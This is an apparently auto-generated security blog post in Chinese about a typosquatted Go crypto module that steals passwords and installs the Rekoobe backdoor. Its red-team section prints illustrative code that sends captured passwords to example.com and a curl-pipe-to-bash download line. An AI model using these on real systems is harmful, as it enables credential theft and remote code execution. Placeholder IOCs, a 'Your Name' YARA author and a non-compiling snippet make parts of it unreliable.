---
layout: post
title:  "Malicious Go Crypto Module Steals Passwords, Deploys Rekoobe Backdoor"
date:   2026-02-27 18:33:25 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Go 語言的 Rekoobe 後門攻擊：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: `Namespace Confusion`, `Dependency Injection`, `SSH Key Injection`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 Go 語言的 `github.com/xinfeisoft/crypto` 套件，該套件偽裝成合法的 `golang.org/x/crypto` 套件，但實際上包含惡意代碼。這些惡意代碼會在使用 `ReadPassword()` 函數時捕獲輸入的密碼，並將其傳送到遠端伺服器。
* **攻擊流程圖解**:
  1. 攻擊者將惡意套件 `github.com/xinfeisoft/crypto` 上傳到 GitHub。
  2. 受害者在其 Go 專案中使用 `github.com/xinfeisoft/crypto` 套件。
  3. 當受害者使用 `ReadPassword()` 函數時，惡意代碼會捕獲輸入的密碼並傳送到遠端伺服器。
  4. 遠端伺服器回傳一個 shell 腳本，該腳本會被執行。
* **受影響元件**: Go 語言的 `github.com/xinfeisoft/crypto` 套件，所有使用此套件的 Go 專案。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 GitHub 帳戶，並能夠上傳套件。
* **Payload 建構邏輯**:

    ```
    
    go
    // 惡意套件的代碼
    package crypto
    
    import (
    	"fmt"
    	"io/ioutil"
    	"net/http"
    )
    
    func ReadPassword() (string, error) {
    	// ...
    	// 捕獲輸入的密碼並傳送到遠端伺服器
    	url := "http://example.com/collect_password"
    	req, err := http.NewRequest("POST", url, strings.NewReader(password))
    	if err != nil {
    		return "", err
    	}
    	resp, err := http.DefaultClient.Do(req)
    	if err != nil {
    		return "", err
    	}
    	defer resp.Body.Close()
    	// ...
    }
    
    ```
* **範例指令**: 使用 `curl` 命令下載並執行 shell 腳本。

```

bash
curl -s http://example.com/shell_script.sh | bash

```
* **繞過技術**: 攻擊者可以使用 `github.com/xinfeisoft/crypto` 套件的版本號來繞過防禦措施。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `1234567890abcdef` | `192.0.2.1` | `example.com` | `/home/ubuntu/.ssh/authorized_keys` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Rekoobe_Detection {
      meta:
        description = "Rekoobe 後門攻擊"
        author = "Your Name"
      strings:
        $a = "github.com/xinfeisoft/crypto"
        $b = "ReadPassword()"
      condition:
        $a and $b
    }
    
    ```
* **緩解措施**: 刪除 `github.com/xinfeisoft/crypto` 套件，並更新 Go 專案的依賴項。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Namespace Confusion (命名空間混淆)**: 想像兩個不同的套件有相同的名稱，但實際上是不同的套件。技術上是指攻擊者利用命名空間混淆來偽裝成合法的套件。
* **Dependency Injection (依賴注入)**: 想像一個套件需要另一個套件的功能。技術上是指攻擊者利用依賴注入來將惡意代碼注入到受害者的套件中。
* **SSH Key Injection (SSH 金鑰注入)**: 想像攻擊者將其 SSH 金鑰注入到受害者的系統中。技術上是指攻擊者利用 SSH 金鑰注入來獲得受害者的系統存取權。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/malicious-go-crypto-module-steals.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


